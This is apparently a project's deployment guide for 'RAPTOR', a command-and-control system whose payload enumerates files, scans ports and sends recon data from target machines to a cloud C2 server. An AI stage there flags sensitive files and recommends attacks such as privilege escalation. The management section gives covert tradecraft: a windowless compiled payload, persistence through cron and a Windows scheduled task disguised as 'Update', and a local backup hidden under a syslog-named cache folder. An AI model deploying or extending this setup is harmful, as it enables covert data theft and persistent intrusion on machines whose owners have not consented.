# 🚀 RAPTOR Cloud Deployment - Complete Workflow

## 📊 Overview

This document shows the **complete end-to-end workflow** of deploying RAPTOR to the cloud and running it on remote systems.

---

## 🎯 Architecture: Before vs After

### Before (Local Development)
```
┌─────────────────────────────────────────────┐
│  Your Development Machine                   │
│  ┌──────────────┐      ┌─────────────────┐ │
│  │  C2 Server   │ <──> │  Payload        │ │
│  │  localhost   │      │  localhost      │ │
│  └──────────────┘      └─────────────────┘ │
│                                             │
│  Everything runs on same machine            │
└─────────────────────────────────────────────┘
```

### After (Cloud Deployment)
```
┌──────────────────────────────┐           ┌──────────────────────────────┐
│  Cloud VPS                   │           │  Target VM #1 (Windows)      │
│  (Always Running)            │           │                              │
│  ┌────────────────────────┐  │           │  ┌────────────────────────┐  │
│  │  RAPTOR C2 Server      │  │  <──────  │  │  payload_cloud.py      │  │
│  │  • Nginx (SSL)         │  │   HTTPS   │  │  • Enumerates files    │  │
│  │  • Django + AI         │  │           │  │  • Sends recon data    │  │
│  │  • Report Generator    │  │           │  └────────────────────────┘  │
│  └────────────────────────┘  │           └──────────────────────────────┘
│                              │                          
│  https://your-domain.com     │           ┌──────────────────────────────┐
└──────────────────────────────┘           │  Target VM #2 (Linux)        │
         ▲                                 │                              │
         │                                 │  ┌────────────────────────┐  │
         │                                 │  │  payload_cloud.py      │  │
         └─────────────────────────────────│  │  • System info         │  │
                   HTTPS                   │  │  • Port scanning       │  │
                                           │  └────────────────────────┘  │
                                           └──────────────────────────────┘

All VMs connect to same C2 server independently
```

---

## 🔄 Complete Workflow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          DEPLOYMENT WORKFLOW                                │
└─────────────────────────────────────────────────────────────────────────────┘

PHASE 1: VPS SETUP
──────────────────────────────────────────────────────────────────────────────
  
  Step 1.1: SSH to VPS
  ┌──────────────────────────────────────┐
  │  $ ssh root@your-vps-ip              │
  │  Welcome to Ubuntu 20.04...          │
  └──────────────────────────────────────┘
                    ↓
  
  Step 1.2: Run Deployment Script
  ┌──────────────────────────────────────┐
  │  $ sudo ./deploy_to_vps.sh           │
  │  Enter domain: raptor.example.com    │
  │  Enter GitHub user: yourusername     │
  │  Install SSL? y                      │
  └──────────────────────────────────────┘
                    ↓
  
  Step 1.3: Automated Installation
  ┌──────────────────────────────────────┐
  │  [✓] Installing dependencies         │
  │  [✓] Creating application user       │
  │  [✓] Cloning repository              │
  │  [✓] Setting up virtual env          │
  │  [✓] Configuring Django              │
  │  [✓] Setting up Gunicorn             │
  │  [✓] Configuring Nginx               │
  │  [✓] Installing SSL certificate      │
  │  [✓] Configuring firewall            │
  │  [✓] Starting services               │
  └──────────────────────────────────────┘
                    ↓
  
  Step 1.4: C2 Server Running
  ┌──────────────────────────────────────┐
  │  ✅ RAPTOR C2 LIVE!                  │
  │  URL: https://raptor.example.com     │
  │  Admin: https://...com/admin/        │
  │  API: https://...com/api/submit_scan/│
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────

PHASE 2: TESTING
──────────────────────────────────────────────────────────────────────────────
  
  Step 2.1: Run Test Script
  ┌──────────────────────────────────────┐
  │  $ ./test_cloud_deployment.sh \      │
  │    https://raptor.example.com        │
  └──────────────────────────────────────┘
                    ↓
  
  Step 2.2: Verification
  ┌──────────────────────────────────────┐
  │  [1/5] Testing connectivity... ✓     │
  │  [2/5] Testing API endpoint... ✓     │
  │  [3/5] Checking session... ✓         │
  │  [4/5] Waiting for processing... ✓   │
  │  [5/5] All tests passed! ✓           │
  │                                      │
  │  Session ID: abc123...               │
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────

PHASE 3: PAYLOAD CONFIGURATION
──────────────────────────────────────────────────────────────────────────────
  
  Step 3.1: Edit payload_cloud.py
  ┌──────────────────────────────────────┐
  │  # BEFORE                            │
  │  C2_SERVER = "http://127.0.0.1:8000" │
  │                                      │
  │  # AFTER                             │
  │  C2_SERVER = "https://raptor.example.com"│
  └──────────────────────────────────────┘
                    ↓
  
  Step 3.2: Configure Options (Optional)
  ┌──────────────────────────────────────┐
  │  MAX_FILES = 500                     │
  │  MAX_DEPTH = 3                       │
  │  ENABLE_PORT_SCAN = False            │
  │  SILENT_MODE = False                 │
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────

PHASE 4: TARGET VM EXECUTION
──────────────────────────────────────────────────────────────────────────────
  
  Step 4.1: Transfer Payload to Target
  ┌──────────────────────────────────────┐
  │  # Option A: Git clone               │
  │  $ git clone https://github.com/...  │
  │                                      │
  │  # Option B: Direct download         │
  │  $ curl -O https://.../payload_cloud.py│
  │                                      │
  │  # Option C: Compiled executable     │
  │  Transfer payload_cloud.exe          │
  └──────────────────────────────────────┘
                    ↓
  
  Step 4.2: Run Payload on Target VM
  ┌──────────────────────────────────────┐
  │  Target VM $ python3 payload_cloud.py│
  │                                      │
  │  [1/4] Gathering system info... ✓    │
  │  [2/4] Scanning ports... ✓           │
  │  [3/4] Enumerating files... ✓        │
  │  [4/4] Contacting C2... ✓            │
  │                                      │
  │  Session ID: xyz789...               │
  └──────────────────────────────────────┘
                    ↓
                    
  Step 4.3: Data Sent to Cloud C2
  ┌──────────────────────────────────────┐
  │  POST https://raptor.example.com/api/│
  │                                      │
  │  {                                   │
  │    "recon_data": {                   │
  │      "hostname": "target-pc",        │
  │      "os_name": "Windows 10",        │
  │      "files": [...500 files...],     │
  │      "open_ports": [80, 443]         │
  │    }                                 │
  │  }                                   │
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────

PHASE 5: C2 PROCESSING (Automated)
──────────────────────────────────────────────────────────────────────────────
  
  Step 5.1: Session Created
  ┌──────────────────────────────────────┐
  │  Django creates Session UUID         │
  │  Status: "recon"                     │
  └──────────────────────────────────────┘
                    ↓
  
  Step 5.2: AI Pipeline (Background Thread)
  ┌──────────────────────────────────────┐
  │  [Step 1] File enumeration           │
  │  Status: "recon" ──────────────────► │
  │                                      │
  │  [Step 2] File sensitivity AI        │
  │  Status: "analysis" ─────────────►   │
  │  LightGBM classifies 500 files       │
  │  Found: 12 sensitive files           │
  │                                      │
  │  [Step 3] Attack decision AI         │
  │  Status: "attack" ───────────────►   │
  │  Determines: "medium" risk level     │
  │  Recommends: privilege escalation    │
  │                                      │
  │  [Step 4] Report generation          │
  │  Status: "reporting" ────────────►   │
  │  Generates: PDF with LaTeX           │
  │                                      │
  │  [Step 5] Complete                   │
  │  Status: "complete" ──────────────►  │
  └──────────────────────────────────────┘
                    ↓
  
  Step 5.3: Results Ready
  ┌──────────────────────────────────────┐
  │  Session: xyz789...                  │
  │  Status: complete                    │
  │  Report: /media/reports/xyz789.pdf   │
  │  Summary:                            │
  │    - Risk Level: medium              │
  │    - Sensitive Files: 12             │
  │    - Total Findings: 45              │
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────

PHASE 6: MONITORING & RESULTS
──────────────────────────────────────────────────────────────────────────────
  
  Step 6.1: Check via Web Dashboard
  ┌──────────────────────────────────────┐
  │  Visit: https://raptor.example.com/admin/│
  │  Login with superuser credentials    │
  │  View all sessions                   │
  │  Download PDF reports                │
  └──────────────────────────────────────┘
  
  Step 6.2: Check via API
  ┌──────────────────────────────────────┐
  │  $ curl https://raptor.example.com/  │
  │    api/session/xyz789/               │
  │                                      │
  │  Response:                           │
  │  {                                   │
  │    "session_id": "xyz789...",        │
  │    "status": "complete",             │
  │    "report_path": "/media/...",      │
  │    "summary": {...}                  │
  │  }                                   │
  └──────────────────────────────────────┘
  
  Step 6.3: Check Server Logs
  ┌──────────────────────────────────────┐
  │  VPS $ sudo journalctl -u raptor -f  │
  │                                      │
  │  [INFO] Session xyz789 created       │
  │  [INFO] Starting pipeline...         │
  │  [INFO] File analysis complete       │
  │  [INFO] Attack decision complete     │
  │  [INFO] Report generated             │
  │  [INFO] Session complete             │
  └──────────────────────────────────────┘

──────────────────────────────────────────────────────────────────────────────
```

---

## 📋 Deployment Checklist

### Pre-Deployment
- [ ] VPS provisioned (Ubuntu 20.04+, 2GB+ RAM)
- [ ] Domain name configured (optional, for SSL)
- [ ] SSH access to VPS configured
- [ ] GitHub repository updated

### VPS Deployment
- [ ] Ran `deploy_to_vps.sh`
- [ ] Services started successfully
- [ ] Firewall configured
- [ ] SSL certificate installed (if using domain)
- [ ] Admin user created
- [ ] Test deployment passed

### Payload Configuration
- [ ] `payload_cloud.py` C2_SERVER updated
- [ ] Dependencies installed on target VM
- [ ] Payload transferred to target VM
- [ ] Configuration options set (MAX_FILES, etc.)

### Testing
- [ ] API endpoint responds
- [ ] Payload connects to C2
- [ ] Session created successfully
- [ ] AI pipeline executes
- [ ] Report generated
- [ ] Web dashboard accessible

---

## 🔧 Management Commands

### On VPS (C2 Server)

```bash
# Start/Stop/Restart
sudo systemctl start raptor
sudo systemctl stop raptor
sudo systemctl restart raptor

# View status
sudo systemctl status raptor
sudo systemctl status nginx

# View logs (real-time)
sudo journalctl -u raptor -f
sudo tail -f /var/log/nginx/raptor_access.log

# View logs (historical)
sudo journalctl -u raptor -n 100
sudo journalctl -u raptor --since "1 hour ago"

# Update code
sudo su - raptor
cd raptor
git pull
exit
sudo systemctl restart raptor

# Backup database
sudo cp /home/raptor/raptor/src/c2/db.sqlite3 \
       /home/raptor/backup_$(date +%Y%m%d).sqlite3

# SSL certificate renewal
sudo certbot renew
sudo certbot renew --dry-run  # Test renewal
```

### On Target VM (Payload)

```bash
# Run payload
python3 payload_cloud.py

# Compile to executable (development machine)
pyinstaller --onefile --noconsole payload_cloud.py

# Schedule recurring execution (Linux)
crontab -e
# Add: 0 9 * * * python3 /path/to/payload_cloud.py

# Schedule recurring execution (Windows)
schtasks /create /tn "Update" /tr "C:\payload_cloud.exe" /sc daily /st 09:00
```

---

## 📊 File Locations Reference

### On VPS
```
/home/raptor/raptor/              # Application root
├── src/c2/                       # Django application
│   ├── db.sqlite3                # Database
│   ├── media/reports/            # Generated PDFs
│   └── staticfiles/              # Static assets
├── logs/                         # Application logs
│   ├── django.log
│   ├── gunicorn_access.log
│   └── gunicorn_error.log
├── venv/                         # Python environment
└── gunicorn_config.py            # Server config

/etc/systemd/system/raptor.service  # Service definition
/etc/nginx/sites-available/raptor   # Nginx configuration
/var/log/nginx/                     # Nginx logs
```

### On Target VM
```
payload_cloud.py                  # Main payload script
~/.cache/syslog/recon_*.json      # Local backup (if enabled)
```

---

## 🎯 Success Metrics

Your deployment is successful when:

1. ✅ **VPS**: C2 server responds at your domain/IP
2. ✅ **API**: Test call returns valid session_id
3. ✅ **Connectivity**: Payload can reach C2 from target VM
4. ✅ **Pipeline**: AI processing completes successfully
5. ✅ **Reports**: PDF reports generate and are downloadable
6. ✅ **Dashboard**: Admin panel accessible and functional
7. ✅ **Security**: SSL enabled, firewall configured
8. ✅ **Monitoring**: Logs show successful operations

---

## 🚨 Common Issues & Solutions

| Issue | Solution |
|-------|----------|
| **502 Bad Gateway** | `sudo systemctl restart raptor nginx` |
| **Can't connect from payload** | Check firewall: `sudo ufw status` |
| **SSL certificate error** | Renew: `sudo certbot renew` |
| **Database locked** | Upgrade to PostgreSQL for production |
| **Reports not generating** | Check pdflatex: `which pdflatex` |
| **Session stuck in processing** | Check logs: `sudo journalctl -u raptor -n 50` |

---

## 📚 Related Documentation

- **Quick Start**: `CLOUD_SETUP_SIMPLE.md`
- **Full Guide**: `docs/CLOUD_DEPLOYMENT.md`
- **Quick Reference**: `docs/QUICKSTART_CLOUD.md`
- **Architecture**: `docs/ARCHITECTURE.md`
- **API Documentation**: `README.md`

---

**🎉 You now have a complete understanding of the RAPTOR cloud deployment workflow! 🎉**

For detailed steps, refer to `CLOUD_SETUP_SIMPLE.md` to get started.
